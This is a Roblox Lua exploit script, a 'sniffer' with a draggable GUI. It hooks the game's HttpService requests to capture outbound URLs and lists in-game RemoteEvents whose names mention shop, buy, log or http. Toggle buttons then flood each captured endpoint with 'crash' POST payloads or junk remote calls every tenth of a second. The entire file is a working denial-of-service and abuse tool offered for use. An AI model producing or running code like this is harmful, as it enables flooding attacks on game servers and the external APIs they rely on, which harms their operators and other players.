local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- Cleanup
if CoreGui:FindFirstChild("IkyyPremium_V14") then CoreGui:FindFirstChild("IkyyPremium_V14"):Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "IkyyPremium_V14"
ScreenGui.Parent = CoreGui

-- UI Helpers
local function AddCorner(p, r) local c = Instance.new("UICorner") c.CornerRadius = UDim.new(0, r) c.Parent = p end
local function MakeDraggable(f)
    local d, di, ds, sp
    f.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = true ds = i.Position sp = f.Position end end)
    f.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then di = i end end)
    UserInputService.InputChanged:Connect(function(i) if i == di and d then local del = i.Position - ds f.Position = UDim2.new(sp.X.Scale, sp.X.Offset + del.X, sp.Y.Scale, sp.Y.Offset + del.Y) end end)
    UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = false end end)
end

-- Main UI
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 320, 0, 480)
Main.Position = UDim2.new(0.5, -160, 0.5, -240)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
Main.Parent = ScreenGui
AddCorner(Main, 15)
MakeDraggable(Main)

local Stroke = Instance.new("UIStroke")
Stroke.Thickness = 2
Stroke.Color = Color3.fromRGB(0, 255, 150)
Stroke.Parent = Main

local Title = Instance.new("TextLabel")
Title.Text = "IKYY AUTO-HTTPS SNIFFER V14"
Title.Size = UDim2.new(1, 0, 0, 45)
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 13
Title.BackgroundTransparency = 1
Title.Parent = Main

-- Scroll Area for Detected URLs & Remotes
local Scroll = Instance.new("ScrollingFrame")
Scroll.Size = UDim2.new(1, -20, 1, -120)
Scroll.Position = UDim2.new(0, 10, 0, 50)
Scroll.BackgroundTransparency = 1
Scroll.ScrollBarThickness = 2
Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
Scroll.Parent = Main

local Layout = Instance.new("UIListLayout")
Layout.Parent = Scroll
Layout.Padding = UDim.new(0, 8)
Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    Scroll.CanvasSize = UDim2.new(0, 0, 0, Layout.AbsoluteContentSize.Y + 10)
end)

-- Status Footer
local Footer = Instance.new("TextLabel")
Footer.Size = UDim2.new(1, 0, 0, 60)
Footer.Position = UDim2.new(0, 0, 1, -65)
Footer.Text = "SNIFFER STATUS: ACTIVE\nWAITING FOR SERVER HTTP REQUEST..."
Footer.TextColor3 = Color3.fromRGB(150, 150, 150)
Footer.Font = Enum.Font.Code
Footer.TextSize = 9
Footer.BackgroundTransparency = 1
Footer.Parent = Main

-- LOGIKA: AUTOMATIC HTTPS SNIFFING (INTERCEPTOR)
local function AddTarget(name, url, isHttp)
    if Scroll:FindFirstChild(name) then return end
    
    local Btn = Instance.new("TextButton")
    Btn.Name = name
    Btn.Size = UDim2.new(1, -5, 0, 50)
    Btn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    Btn.Text = "  " .. (isHttp and "[HTTPS] " or "[REMOTE] ") .. name
    Btn.TextColor3 = Color3.new(1, 1, 1)
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 10
    Btn.TextXAlignment = Enum.TextXAlignment.Left
    Btn.Parent = Scroll
    AddCorner(Btn, 8)

    local Tag = Instance.new("TextLabel")
    Tag.Text = "OFF"
    Tag.Size = UDim2.new(0, 50, 1, 0)
    Tag.Position = UDim2.new(1, -55, 0, 0)
    Tag.TextColor3 = Color3.fromRGB(100, 100, 100)
    Tag.Font = Enum.Font.GothamBold
    Tag.BackgroundTransparency = 1
    Tag.Parent = Btn

    local Active = false
    Btn.MouseButton1Click:Connect(function()
        Active = not Active
        Tag.Text = Active and "SPAMMING" or "OFF"
        Tag.TextColor3 = Active and Color3.fromRGB(255, 50, 50) or Color3.fromRGB(100, 100, 100)
        Btn.BackgroundColor3 = Active and Color3.fromRGB(40, 10, 10) or Color3.fromRGB(20, 20, 25)

        task.spawn(function()
            while Active do
                pcall(function()
                    if isHttp then
                        -- Spamming External HTTPS
                        HttpService:PostAsync(url, HttpService:JSONEncode({["crash"] = string.rep("x", 1000)}))
                    else
                        -- Spamming Internal Remote
                        url:FireServer(string.rep("⚡", 500))
                    end
                end)
                task.wait(0.1)
            end
        end)
    end)
end

-- LOGIKA: HOOKING (Mencegat Request Game)
local oldPost; oldPost = hookfunction(HttpService.PostAsync, function(self, url, data, ...)
    Footer.Text = "SNIFFED HTTPS: " .. url:sub(1, 30) .. "..."
    AddTarget("API_TARGET_" .. tick(), url, true)
    return oldPost(self, url, data, ...)
end)

local oldRequest; oldRequest = hookfunction(HttpService.RequestAsync, function(self, options, ...)
    if options.Url then
        Footer.Text = "SNIFFED REQUEST: " .. options.Url:sub(1, 30) .. "..."
        AddTarget("REQ_TARGET_" .. tick(), options.Url, true)
    end
    return oldRequest(self, options, ...)
end)

-- SCAN REMOTE AWAL
for _, v in pairs(ReplicatedStorage:GetDescendants()) do
    if v:IsA("RemoteEvent") then
        local n = v.Name:lower()
        if n:find("shop") or n:find("buy") or n:find("log") or n:find("http") then
            AddTarget(v.Name, v, false)
        end
    end
end

-- Rainbow
RunService.RenderStepped:Connect(function()
    Stroke.Color = Color3.fromHSV(tick() % 5 / 5, 0.7, 1)
end)

print("Ikyy V14 Sniffer Active! Try to interact with in-game shop to catch URLs.")
